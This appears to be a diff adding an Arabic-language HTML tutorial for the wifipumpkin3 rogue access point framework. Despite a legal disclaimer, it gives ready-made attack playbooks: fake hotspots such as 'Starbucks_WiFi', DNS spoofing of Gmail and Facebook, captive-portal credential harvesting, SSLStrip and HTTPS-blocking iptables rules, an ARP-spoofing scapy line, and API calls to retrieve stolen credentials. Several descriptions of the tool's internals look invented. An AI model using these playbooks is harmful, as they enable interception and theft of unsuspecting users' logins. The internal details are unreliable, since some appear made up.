@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دليل wifipumpkin3 التقني للمبتدئين</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Tahoma', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e6e6e6;
+            line-height: 1.8;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(25, 25, 45, 0.95);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        h1 {
+            color: #00ff88;
+            text-align: center;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+        }
+
+        h2 {
+            color: #00d4ff;
+            border-right: 5px solid #00d4ff;
+            padding-right: 15px;
+            margin: 30px 0 20px 0;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        h2:hover {
+            color: #00ff88;
+            border-right-color: #00ff88;
+        }
+
+        h3 {
+            color: #ffaa00;
+            margin: 20px 0 10px 0;
+        }
+
+        .section {
+            background: rgba(30, 30, 50, 0.7);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            transition: all 0.3s ease;
+        }
+
+        .section:hover {
+            border-color: #00d4ff;
+            box-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
+        }
+
+        .command-box {
+            background: #0d0d1a;
+            border: 1px solid #00ff88;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            color: #00ff88;
+            direction: ltr;
+            text-align: left;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .command-box::before {
+            content: "$ ";
+            color: #ffaa00;
+            font-weight: bold;
+        }
+
+        .example-box {
+            background: rgba(0, 255, 136, 0.1);
+            border-left: 4px solid #00ff88;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .warning-box {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff0000;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .technical-box {
+            background: rgba(0, 212, 255, 0.1);
+            border-left: 4px solid #00d4ff;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .option-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+
+        .option-table th {
+            background: #00d4ff;
+            color: #0d0d1a;
+            padding: 12px;
+            text-align: right;
+        }
+
+        .option-table td {
+            padding: 10px;
+            border-bottom: 1px solid #333;
+        }
+
+        .option-table tr:hover {
+            background: rgba(0, 212, 255, 0.05);
+        }
+
+        .button {
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            color: #0d0d1a;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .expand-icon {
+            display: inline-block;
+            margin-left: 10px;
+            transition: transform 0.3s ease;
+        }
+
+        .expanded .expand-icon {
+            transform: rotate(90deg);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 1.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎃 دليل wifipumpkin3 التقني والتكتيكي</h1>
+        
+        <div class="warning-box" style="font-size: 1.2em; text-align: center;">
+            <strong>⚠️ تحذير قانوني وأخلاقي:</strong> هذه الأداة لإنشاء نقاط وصول WiFi وهمية واختبار MITM للاختبار المصرح به فقط. استخدامها لاعتراض البيانات أو خداع المستخدمين دون إذن صريح يعتبر جريمة في معظم الدول. هدف هذا الدليل التعليمي فقط.
+        </div>
+
+        <div class="section">
+            <h3>ما هو wifipumpkin3؟</h3>
+            <p><strong>wifipumpkin3</strong> هو **framework** كامل مكتوب بلغة Python3 لإنشاء **Rogue Access Points** وشن هجمات **MITM** (Man-in-the-Middle). على عكس wifi-honey البسيط، يوفر واجهة تفاعلية، نظام plugins (Pulp files)، RESTful API، وإدارة sessions متقدمة. يعتمد على <code>hostapd</code>, <code>dnsmasq</code>, <code>iptables</code>، لكنه يربطها جميعًا في **state machine** ذكية.</p>
+        </div>
+
+        <h2 onclick="toggleSection('basics')">
+            <span class="expand-icon">▶</span> الأوامر الأساسية ونظام Pulp
+        </h2>
+        <div id="basics" class="section hidden">
+            <div class="command-box">wifipumpkin3</div>
+            <p>تشغيل الوضع التفاعلي (Interactive Mode). يفتح محث (prompt) يبدأ بـ <code>wp3 ></code> حيث يمكنك كتابة أوامر مثل <code>set interface wlan0</code>, <code>start</code>, <code>stop</code>.</p>
+            
+            <div class="command-box">wifipumpkin3 -i wlan0 -iNet eth0 -m bridge</div>
+            <p>تشغيل مباشر بإعدادات محددة. يخلق AP على wlan0 ويشارك إنترنت eth0 في وضع bridge.</p>
+            
+            <div class="technical-box">
+                <h4>🧠 فلسفة Pulp Files:</h4>
+                <p>wifipumpkin3 يستخدم **نظام سكربتات يُسمى Pulp** (مثل Metasploit resource files). كل سطر في ملف .pulp هو أمر يُنفذ في المحث:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+# example.pulp
+set interface wlan0
+set ssid "Free WiFi"
+set wireless-mode 2
+start
+                </pre>
+                <p>هذا يجعلك تُنشئ **templates** جاهزة للهجمات المتكررة!</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('interfaces')">
+            <span class="expand-icon">▶</span> إدارة الواجهات المتقدمة
+        </h2>
+        <div id="interfaces" class="section hidden">
+            <h3>🔌 الفرق بين -i و-iNet و-m</h3>
+            
+            <div class="section">
+                <h4>-i INTERFACE - واجهة AP الرئيسية</h4>
+                <div class="command-box">wifipumpkin3 -i wlan0</div>
+                <p><strong>الآلية التقنية:</strong> يستخدم <code>pyric</code> (مكتبة Python لإدارة wireless) للتحقق من قدرات الواجهة:</p>
+                <ul style="margin: 10px 20px; color: #00d4ff;">
+                    <li><code>pyric.pyw.interfaces()</code> - لإيجاد جميع الواجهات</li>
+                    <li><code>pyric.pyw.iswireless(card)</code> - للتحقق أنها wireless</li>
+                    <li><code>pyric.pyw.devmodes(card)</code> - للتحقق من قدرات AP mode</li>
+                </ul>
+                <p>إذا كانت الواجهة في managed mode، يستخدم <code>pyric.pyw.down(card)</code> و<code>pyric.pyw.modeset(card, 'monitor')</code> لوضعها في monitor mode تلقائيًا.</p>
+            </div>
+
+            <div class="section">
+                <h4>-iNet INTERFACE_NET - جسر الإنترنت</h4>
+                <div class="command-box">wifipumpkin3 -i wlan0 -iNet eth0</div>
+                <p><strong>الآلية:</strong> يستخدم <code>iptables</code> لإنشاء NAT بين wlan0 وeth0:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+echo 1 > /proc/sys/net/ipv4/ip_forward
+                </pre>
+                <p>هذا يجعل الضحايا على wlan0 يتصلون بالإنترنت عبر eth0. wifipumpkin3 يتحقق من <code>/proc/net/dev</code> لرؤية حركة المرور على eth0.</p>
+            </div>
+
+            <div class="section">
+                <h4>-m WIRELESS_MODE - أوضاع العمل</h4>
+                <div class="command-box">wifipumpkin3 -i wlan0 -m bridge</div>
+                <p><strong>mode bridge:</strong> يستخدم <code>brctl addbr br0</code> لإنشاء bridge، ثم يضيف wlan0 وeth0 إليه. الضحية تحصل على IP من شبكة eth0 الأصلية (لا NAT).</p>
+                
+                <div class="command-box">wifipumpkin3 -i wlan0 -m nat</div>
+                <p><strong>mode nat:</strong> الوضع الافتراضي. يستخدم NAT كما شرحنا أعلاه. الضحية تحصل على IP من نطاق 10.0.0.0/24.</p>
+                
+                <div class="technical-box">
+                    <h4>🎯 متى تستخدم كل وضع؟</h4>
+                    <ul>
+                        <li><strong>bridge:</strong> عندما تريد أن يظهر الضحية على نفس الشبكة الأصلية (لاختبار أدوات الشبكة).</li>
+                        <li><strong>nat:</strong> عندما تريد عزل الضحية ومراقبة حركته بشكل كامل (هجمات MITM).</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>-pI PROTECTINTERFACE - حماية الواجهات</h4>
+                <div class="command-box">wifipumpkin3 -i wlan0 -pI wlan1 wlan2</div>
+                <p><strong>الآلية:</strong> يستخدم <code>NetworkManager</code> dbus API لإضافة wlan1 وwlan2 إلى قائمة <code>unmanaged-devices</code> في <code>/etc/NetworkManager/NetworkManager.conf</code>:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+[keyfile]
+unmanaged-devices=interface-name:wlan1;interface-name:wlan2;
+                </pre>
+                <p>هذا يمنع NetworkManager من التدخل في هذه الواجهات، مما يحمي اتصالاتك الخلفية.</p>
+            </div>
+
+            <div class="section">
+                <h4>-iNM / -rNM - التحكم في NetworkManager</h4>
+                <div class="command-box">wifipumpkin3 -i wlan0 -iNM</div>
+                <p><strong>-iNM:</strong> يستخدم <code>dbus-send --system --print-reply --dest=org.freedesktop.NetworkManager</code> لإضافة wlan0 إلى قائمة ignore مؤقتًا. تُحفظ في <code>wp3.db</code>.</p>
+                
+                <div class="command-box">wifipumpkin3 -rNM</div>
+                <p><strong>-rNM:</strong> يزال wlan0 من قائمة ignore بعد إيقاف wp3. مفيد للعودة إلى الحالة الأصلية.</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('sessions')">
+            <span class="expand-icon">▶</span> نظام Sessions والاستمرارية
+        </h2>
+        <div id="sessions" class="section hidden">
+            <h3>💾 كيف يحفظ wp3 حالة الهجوم؟</h3>
+            
+            <div class="section">
+                <h4>-s SESSION - استدعاء جلسة سابقة</h4>
+                <div class="command-box">wifipumpkin3 -s attack_2025</div>
+                <p><strong>الآلية:</strong> wp3 يستخدم SQLite database في <code>~/.wifipumpkin3/wp3.db</code>. الجدول <code>sessions</code> يحفظ:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+CREATE TABLE sessions (
+    id INTEGER PRIMARY KEY,
+    name TEXT UNIQUE,
+    interface TEXT,
+    ssid TEXT,
+    wireless_mode TEXT,
+    payload TEXT,
+    timestamp DATETIME
+);
+                </pre>
+                <p>عند استخدام <code>-s</code>، يستعلم wp3 عن السجل ويملئ جميع المتغيرات تلقائيًا. هذا يجعلك تستأنف هجومًا توقف بسبب خطأ في غضون ثوانٍ!</p>
+            </div>
+
+            <div class="section">
+                <h4>كيفية إنشاء session في الوضع التفاعلي:</h4>
+                <div class="command-box">
+wp3 > set interface wlan0<br>
+wp3 > set ssid "TargetNetwork"<br>
+wp3 > set wireless-mode nat<br>
+wp3 > save session attack_2025
+                </div>
+                <p>أمر <code>save</code> يدفع wp3 لتنفيذ <code>INSERT OR REPLACE INTO sessions</code> في الـ DB.</p>
+            </div>
+
+            <div class="technical-box">
+                <h4>🎯 السيناريو العملي:</h4>
+                <p>أنت في اختبار اختراق لشركة. تستغرق 30 دقيقة لإعداد wp3 مع plugins محددة. يمكنك حفظ الجلسة:</p>
+                <div class="command-box">wp3 > save session corporate_pentest</div>
+                <p>في المرة التالية:</p>
+                <div class="command-box">wifipumpkin3 -s corporate_pentest -p start</div>
+                <p>تبدأ الهجوم فورًا دون إعادة الإعداد!</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('pulp')">
+            <span class="expand-icon">▶</span> نظام Pulp - أتمتة الهجمات
+        </h2>
+        <div id="pulp" class="section hidden">
+            <h3>🤖 آلية Pulp Files</h3>
+            
+            <div class="section">
+                <h4>-p, --pulp PULP - تشغيل سكريبت كامل</h4>
+                <div class="command-box">wifipumpkin3 -p attack.pulp</div>
+                <p><strong>الآلية:</strong> wp3 يقرأ الملف سطرًا بسطرًا وينفذ كل أمر كما لو كتبته في المحث. الملف attack.pulp:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+# تهيئة
+set interface wlan0
+set ssid "Free_WiFi"
+set wireless-mode nat
+
+# تفعيل plugins
+plugins load dns_spoof
+plugins load captiva
+
+# بدء الهجوم
+start
+
+# انتظار 30 ثانية
+sleep 30
+
+# عرض المصادقات
+creds show
+
+# إيقاف
+stop
+                </pre>
+                <p>wp3 يستخدم <code>exec()</code> لتنفيذ كل سطر في سياق محثه. هذا يجعلك تُنشئ **playbooks** جاهزة!</p>
+            </div>
+
+            <div class="section">
+                <h4>-x, --xpulp XPULP - سكريبت سطر واحد</h4>
+                <div class="command-box">wifipumpkin3 -x "set ssid Test; start; sleep 10; stop"</div>
+                <p><strong>الآلية:</strong> يستخدم <code>split(';')</code> لتقسيم السلسلة إلى أوامر، ثم ينفذها بالتسلسل. مفيد للسكربتات الخارجية:</p>
+                <div class="command-box">
+for ssid in $(cat targets.txt); do<br>
+&nbsp;&nbsp;wifipumpkin3 -x "set ssid $ssid; start; sleep 60; stop"<br>
+done
+                </div>
+            </div>
+
+            <div class="technical-box">
+                <h4>🎯 متى تستخدم Pulp؟</h4>
+                <ul>
+                    <li><strong>اختبار تلقائي:</strong> تشغيل 10 سيناريوهات مختلفة ليلاً</li>
+                    <li><strong>تدريب:</strong> إنشاء سكريبتات جاهزة للطلاب</li>
+                    <li><strong>تجنب الأخطاء:</strong> لا تنسى خطوة حاسمة في الهجوم</li>
+                </ul>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('rest')">
+            <span class="expand-icon">▶</span> RESTful API - التحكم عن بُعد
+        </h2>
+        <div id="rest" class="section hidden">
+            <h3>🔌 كيف يعمل API داخليًا؟</h3>
+            
+            <div class="section">
+                <h4>--rest - تفعيل API</h4>
+                <div class="command-box">wifipumpkin3 --rest --restport 1337</div>
+                <p><strong>الآلية:</strong> wp3 يبدأ خيطًا (thread) جديدًا يشغل **Flask server**:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+from flask import Flask, request, jsonify
+app = Flask(__name__)
+
+@app.route('/api/v1/start', methods=['POST'])
+def start_attack():
+    # يستدعي wp3.start() من الخيط الرئيسي
+    return jsonify({"status": "started"})
+
+app.run(host='0.0.0.0', port=1337)
+                </pre>
+                <p>هذا يجعلك تتحكم في wp3 من أي مكان!</p>
+            </div>
+
+            <div class="section">
+                <h4>--username و--password - المصادقة</h4>
+                <div class="command-box">wifipumpkin3 --rest --username admin --password s3cr3t</div>
+                <p><strong>الآلية:</strong> يستخدم **HTTP Basic Auth** مع Flask-HTTPAuth. يحفظ البيانات في <code>wp3.db</code> جدول <code>auth</code>:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+auth = HTTPBasicAuth()
+@auth.verify_password
+def verify(username, password):
+    return check_auth_db(username, password)
+                </pre>
+            </div>
+
+            <div class="section">
+                <h4>المسارات (Endpoints) الرئيسية:</h4>
+                <table class="option-table">
+                    <tr>
+                        <th>مسار</th>
+                        <th>الطريقة</th>
+                        <th>الوظيفة</th>
+                    </tr>
+                    <tr>
+                        <td><code>/api/v1/start</code></td>
+                        <td>POST</td>
+                        <td>بدء الهجوم</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/v1/stop</code></td>
+                        <td>POST</td>
+                        <td>إيقاف الهجوم</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/v1/status</code></td>
+                        <td>GET</td>
+                        <td>حالة AP (active, stopped, clients)</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/v1/creds</code></td>
+                        <td>GET</td>
+                        <td>استرجاع المصادقات المسروقة</td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="example-box">
+                <strong>💡 السيناريو: هجوم من هاتفك:</strong>
+                <div class="command-box">
+curl -X POST http://admin:s3cr3t@192.168.1.100:1337/api/v1/start<br>
+curl http://admin:s3cr3t@192.168.1.100:1337/api/v1/creds
+                </div>
+                <p>يمكنك التحكم في wp3 من تطبيقك الخاص أو حتى من هاتفك أثناء الاختبار!</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('mitm')">
+            <span class="expand-icon">▶</span> أوضاع الهجوم MITM والـ Wireless Modes
+        </h2>
+        <div id="mitm" class="section hidden">
+            <h3>🎯 كيف يستغل wp3 حركة المرور؟</h3>
+            
+            <div class="section">
+                <h4>-m WIRELESS_MODE - الخيارات المتقدمة</h4>
+                <div class="command-box">wifipumpkin3 -i wlan0 -m transparent</div>
+                <p><strong>transparent mode:</strong> لا يغير أي IP. يستخدم <code>iptables -t mangle</code> لإعادة توجيه حزم TCP/UDP دون تعديل IP المصدر. مفيد عندما تريد أن يظهر الضحية على نفس الشبكة الأصلية.</p>
+                
+                <div class="command-box">wifipumpkin3 -i wlan0 -m hostapd</div>
+                <p><strong>hostapd mode:</strong> يستخدم hostapd.conf مخصص. يمنحك تحكمًا كاملًا في BSSID, channel, encryption. wp3 يولد config file في <code>/tmp/hostapd-*.conf</code>.</p>
+            </div>
+
+            <div class="section">
+                <h4>ARP Spoofing داخلي</h4>
+                <p>wp3 يستخدم <code>scapy</code> لإرسال حزم ARP مزيفة:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac), inter=2, loop=1)
+                </pre>
+                <p>يُرسل كل 2 ثوانٍ لضمان بقاء الضحية يظن أنك أنت الـ gateway.</p>
+            </div>
+
+            <div class="section">
+                <h4>DNS Hijacking - الاستيلاء على النطاقات</h4>
+                <div class="command-box">
+wp3 > plugins load dns_spoof<br>
+wp3 > set dns_spoof domains facebook.com,instagram.com
+                </div>
+                <p><strong>الآلية:</strong> wp3 يستخدم <code>dnsmasq</code> مع <code>address=/facebook.com/10.0.0.1</code>. يتدخل في حزم DNS ويعيد IP خاصه بدلاً من IP الحقيقي.</p>
+                
+                <div class="technical-box">
+                    <h4>🎯 كيف يتجنب DNS over HTTPS (DoH):</h4>
+                    <p>wp3 يستخدم <code>iptables</code> لحجب حركة HTTPS على المنفذ 443:</p>
+                    <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+iptables -A FORWARD -p tcp --dport 443 -j DROP
+                    </pre>
+                    <p>يجبر المتصفح على الالتفاف إلى DNS العادي.</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>SSLStrip - إزالة التشفير</h4>
+                <p>wp3 يستخدم <code>mitmproxy</code> أو <code>sslstrip</code> لإعادة توجيه HTTPS إلى HTTP:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
+                </pre>
+                <p>البروكسي على المنفذ 8080 يفك TLS ويعيد HTTP. wp3 يحقن JavaScript لتغيير <code>https://</code> إلى <code>http://</code> في HTML.</p>
+            </div>
+        </h2>
+
+        <h2 onclick="toggleSection('plugins')">
+            <span class="expand-icon">▶</span> نظام Plugins المتقدم
+        </h2>
+        <div id="plugins" class="section hidden">
+            <h3>🧩 بنية Plugin في wp3</h3>
+            
+            <div class="section">
+                <h4>أهم Plugins:</h4>
+                <table class="option-table">
+                    <tr>
+                        <th>Plugin</th>
+                        <th>الوظيفة</th>
+                        <th>الأمر</th>
+                    </tr>
+                    <tr>
+                        <td><code>captive</code></td>
+                        <td>صفحة تسجيل Captive Portal</td>
+                        <td><code>plugins load captive</code></td>
+                    </tr>
+                    <tr>
+                        <td><code>dns_spoof</code></td>
+                        <td>تعديل DNS</td>
+                        <td><code>plugins load dns_spoof</code></td>
+                    </tr>
+                    <tr>
+                        <td><code>beef</code></td>
+                        <td>حقن Browser Exploitation Framework</td>
+                        <td><code>plugins load beef</code></td>
+                    </tr>
+                    <tr>
+                        <td><code>sslstrip</code></td>
+                        <td>إزالة تشفير HTTPS</td>
+                        <td><code>plugins load sslstrip</code></td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="section">
+                <h4>كيف يحمّل Plugin:</h4>
+                <div class="command-box">
+wp3 > plugins load dns_spoof
+                </div>
+                <p>wp3 يبحث في <code>/usr/share/wifipumpkin3/plugins/</code> عن ملف <code>dns_spoof.py</code>. يستخدم <code>importlib.import_module()</code> لتحميله ديناميكيًا. كل plugin يجب أن يطبق:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+class PluginName:
+    def __init__(self, parent):
+        self.parent = parent  # للوصول إلى wp3 core
+    
+    def start(self):
+        # كود بدء الهجوم
+    
+    def stop(self):
+        # كود إيقاف الهجوم
+                </pre>
+            </div>
+
+            <div class="example-box">
+                <strong>💡 السيناريو: هجوم كامل مع plugins:</strong>
+                <div class="command-box">
+wp3 > set ssid "Free WiFi"<br>
+wp3 > plugins load dns_spoof<br>
+wp3 > plugins load captive<br>
+wp3 > plugins load sslstrip<br>
+wp3 > start
+                </div>
+                <p>1. الضحية يتصل بـ "Free WiFi"<br>
+                2. يفتح المتصفح، captive portal يظهر<br>
+                3. dns_spoof يعدّل DNS لمواقع محددة<br>
+                4. sslstrip يفك تشفير HTTPS<br>
+                5. كل حركة تُسجل في <code>creds.txt</code></p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('advanced')">
+            <span class="expand-icon">▶</span> الأوامر المتقدمة والسيناريوهات
+        </h2>
+        <div id="advanced" class="section hidden">
+            <div class="section">
+                <h4>🎯 The "Silent Harvester" (جمع صامت)</h4>
+                <div class="command-box">wifipumpkin3 -i wlan0 -iNet eth0 -p harvest.pulp</div>
+                <p>**harvest.pulp:**</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+set ssid "Starbucks_WiFi"
+set wireless-mode nat
+plugins load dns_spoof
+plugins load captive
+set dns_spoof domains gmail.com,facebook.com
+start
+sleep 300
+creds show
+stop
+                </pre>
+                <p><strong>النتيجة:</strong> بعد 5 دقائق، لديك قائمة بكل من حاول تسجيل الدخول إلى Gmail/Facebook.</p>
+            </div>
+
+            <div class="section">
+                <h4>🥷 The "Distributed Attack" (هجوم موزع)</h4>
+                <div class="command-box">wifipumpkin3 --rest --restport 1337 -i wlan0</div>
+                <p>على جهاز آخر:</p>
+                <div class="command-box">curl -X POST -d '{"ssid":"FakeAP"}' http://admin:pass@192.168.1.100:1337/api/v1/config</div>
+                <p>يمكنك التحكم في 10 أجهزة wp3 من مركز تحكم واحد!</p>
+            </div>
+
+            <div class="section">
+                <h4>💉 The "Continuous Attack" (هجوم مستمر)</h4>
+                <div class="command-box">
+for ssid in $(cat targets.txt); do<br>
+&nbsp;&nbsp;wifipumpkin3 -x "set ssid $ssid; start; sleep 60; stop"<br>
+done
+                </div>
+                <p>يجرب كل SSID في الملف لمدة دقيقة. مفيد لاختبار أي SSID يجذب أكبر عدد من الضحايا.</p>
+            </div>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <button class="button" onclick="showAllSections()">إظهار كل الأقسام</button>
+            <button class="button" onclick="hideAllSections()">إخفاء كل الأقسام</button>
+        </div>
+    </div>
+
+    <script>
+        function toggleSection(id) {
+            const section = document.getElementById(id);
+            const header = section.previousElementSibling;
+            
+            section.classList.toggle('hidden');
+            header.classList.toggle('expanded');
+        }
+
+        function showAllSections() {
+            document.querySelectorAll('.section').forEach(section => section.classList.remove('hidden'));
+            document.querySelectorAll('h2').forEach(header => header.classList.add('expanded'));
+        }
+
+        function hideAllSections() {
+            document.querySelectorAll('.section').forEach(section => section.classList.add('hidden'));
+            document.querySelectorAll('h2').forEach(header => header.classList.remove('expanded'));
+        }
+
+        document.querySelectorAll('.command-box').forEach(box => {
+            box.addEventListener('click', function() {
+                const text = this.textContent.replace('$ ', '');
+                navigator.clipboard.writeText(text).then(() => {
+                    this.style.background = '#00ff88';
+                    this.style.color = '#0d0d1a';
+                    setTimeout(() => {
+                        this.style.background = '#0d0d1a';
+                        this.style.color = '#00ff88';
+                    }, 500);
+                });
+            });
+        });
+
+        window.addEventListener('load', () => {
+            document.getElementById('basics').classList.remove('hidden');
+            document.querySelector('h2[onclick*="basics"]').classList.add('expanded');
+        });
+    </script>
+</body>
+</html>
